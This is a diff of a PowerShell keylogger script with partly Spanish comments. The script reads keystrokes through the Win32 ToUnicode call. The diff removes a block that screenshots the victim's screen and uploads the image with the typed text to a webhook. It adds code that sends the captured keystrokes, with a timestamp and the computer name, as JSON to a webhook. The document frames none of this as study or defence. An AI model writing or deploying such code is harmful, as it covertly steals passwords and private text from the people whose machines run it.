@@ -27,9 +27,6 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 '@
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 
-# shortened URL Detection
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}
-
 # Importar el módulo Windows Input Simulator si no está instalado
 if (-not (Get-Module -Name WindowsInput)) {
     Install-Module -Name WindowsInput -Scope CurrentUser -Force
@@ -78,44 +75,12 @@ While ($true){
     }
     finally{
       If ($keyPressed) {
-      # Capturar la pantalla
-      $Filett = "$env:temp\SC.png"
-      Add-Type -AssemblyName System.Windows.Forms
-      Add-type -AssemblyName System.Drawing
-      $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-      $Width = $Screen.Width
-      $Height = $Screen.Height
-      $Left = $Screen.Left
-      $Top = $Screen.Top
-      $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-      $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-      $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-      $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-
-      # Enviar la imagen y el texto al webhook
-      $boundary = [System.Guid]::NewGuid().ToString()
-      $body = @"
---$boundary
-Content-Disposition: form-data; name="file"; filename="screenshot.png"
-Content-Type: image/png
-
-$Filett
---$boundary
-Content-Disposition: form-data; name="text"
-
-$send
---$boundary--
-"@
-
-      $headers = @{
-          "Content-Type" = "multipart/form-data; boundary=$boundary"
-      }
-
-      Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -Body $body
-
-      # Eliminar la captura de pantalla
-      Remove-Item -Path $Filett
-
+      # Send the saved keys to a webhook
+      $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
+      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
+      $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
+      $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg}
+      Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body ($jsonsys | ConvertTo-Json -Depth 10 -Compress)
       #Remove log file and reset inactivity check 
       $send = ""
       $keyPressed = $false
